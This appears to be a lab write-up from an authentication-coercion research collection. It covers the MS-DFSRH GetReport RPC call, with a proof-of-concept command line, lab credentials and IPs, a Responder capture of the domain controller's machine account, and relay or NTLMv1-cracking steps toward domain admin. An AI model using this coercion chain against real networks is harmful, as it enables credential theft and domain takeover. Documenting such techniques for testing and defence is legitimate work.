# MS-DFSRH - Remote call to GetReport (opnum 9)

## Summary

+ **Protocol**: [[MS-DFSRH]: DFS Replication Helper Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsrh/c3170e6b-e195-4aef-a286-8e6f4923a8ae)

+ **Protocol UUID**: 9009d654-250b-4e0d-9ab0-acb63134f69f

+ **Protocol version**: 0.0

+ **SMB Named pipe**: ``

+ **Function name**: [`GetReport`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsrh/ea839292-129c-4fbf-ac38-de4bb1ba4220)

+ **Function operation number**: `9`

+ **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `` and bind to the desired [`MS-DFSRH`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsrh/c3170e6b-e195-4aef-a286-8e6f4923a8ae) protocol (with uuid `9009d654-250b-4e0d-9ab0-acb63134f69f` and version `0.0`) in order to perform remote procedure calls to functions in the [`MS-DFSRH`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsrh/c3170e6b-e195-4aef-a286-8e6f4923a8ae) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `` This pipe is connected to the protocol [[MS-DFSRH]: DFS Replication Helper Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsrh/c3170e6b-e195-4aef-a286-8e6f4923a8ae) and allows to call RPC functions of this protocol. We will then call the remote [`GetReport`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsrh/ea839292-129c-4fbf-ac38-de4bb1ba4220) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
GetReport('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
HRESULT GetReport(
   [in] GUID replicationGroupGuid,
   [in] BSTR referenceMember,
   [in] BSTR serverName,
   [in] SAFEARRAY (_VersionVectorData)* referenceVersionVectors,
   [in] LONG flags,
   [out] SAFEARRAY (_VersionVectorData)* memberVersionVectors,
   [out] BSTR* reportXML
 );
```

## References

+ Documentation of protocol [MS-DFSRH]: DFS Replication Helper Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsrh/c3170e6b-e195-4aef-a286-8e6f4923a8ae

+ Documentation of function `GetReport`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsrh/ea839292-129c-4fbf-ac38-de4bb1ba4220